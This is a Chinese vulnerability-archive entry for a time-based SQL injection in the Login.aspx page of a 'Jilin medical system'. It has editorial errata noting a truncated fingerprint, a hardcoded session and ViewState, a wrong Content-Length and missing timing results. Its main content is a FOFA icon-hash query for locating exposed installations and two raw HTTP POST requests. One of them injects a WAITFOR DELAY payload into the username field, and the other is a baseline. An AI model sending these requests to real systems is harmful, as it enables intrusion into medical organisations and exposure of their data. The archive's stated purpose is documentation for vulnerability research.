---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "吉林医药系统Login存在SQL注入漏洞"
product: "吉林医药系统/厂商待核"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "无版本修复，不能仅地域+行业当标准产品实体"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E5%90%89%E6%9E%97%E5%8C%BB%E8%8D%AF%E7%B3%BB%E7%BB%9FLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "icon_hash="
fofa: "icon_hash=\"775044030\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gsfq16xdvbag4hu6"
id: "vw-4d26a1c3c46f1e0400b0362a"
entity_id: "ve-4d26a1c3c46f1e0400b0362a"
schema_version: "1"
---

# 吉林医药系统Login存在SQL注入漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：吉林医药系统/厂商待核
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：无版本修复，不能仅地域+行业当标准产品实体
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. FOFA icon_hash=截断
2. 登录ViewState/Session硬编码需说明获取流程
3. 两种长度请求共用Content-Length293错误
4. 有延迟和基线请求无计时结果
5. 无版本修复，不能仅地域+行业当标准产品实体

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/gsfq16xdvbag4hu6>

### 归档技术正文

# 一、漏洞简介
医药系统Login存在SQL注入漏洞

# 二、影响版本
+ 吉林医药系统

# 三、资产测绘
+ fofa`icon_hash="775044030"`


# 四、漏洞复现
```plain
POST /Login.aspx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Cookie: ASP.NET_SessionId=ojsdqzhri20qo0zd3zkonnpx
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 293

__VIEWSTATE=%2FwEPDwUKLTY0OTc3MzY5OA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICAw9kFgICBA8WAh4JaW5uZXJodG1sBSHlkInmnpfnnIHogZrliJvljLvoja%2FmnInpmZDlhazlj7hkZFiU%2FDEzLkPCmDf498pGBLrtD3FC5XsVsdyX0eaNHaa1&tbUser=admin%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&tbPassword=admin&btnLogin=+%B5%C7+%C2%BC+&hfSubmit=&__VIEWSTATEGENERATOR=C2EE9ABB
```


```plain
POST /Login.aspx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Cookie: ASP.NET_SessionId=ojsdqzhri20qo0zd3zkonnpx
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 293

__VIEWSTATE=%2FwEPDwUKLTY0OTc3MzY5OA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICAw9kFgICBA8WAh4JaW5uZXJodG1sBSHlkInmnpfnnIHogZrliJvljLvoja%2FmnInpmZDlhazlj7hkZFiU%2FDEzLkPCmDf498pGBLrtD3FC5XsVsdyX0eaNHaa1&tbUser=admin&tbPassword=admin&btnLogin=+%B5%C7+%C2%BC+&hfSubmit=&__VIEWSTATEGENERATOR=C2EE9ABB
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsfq16xdvbag4hu6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
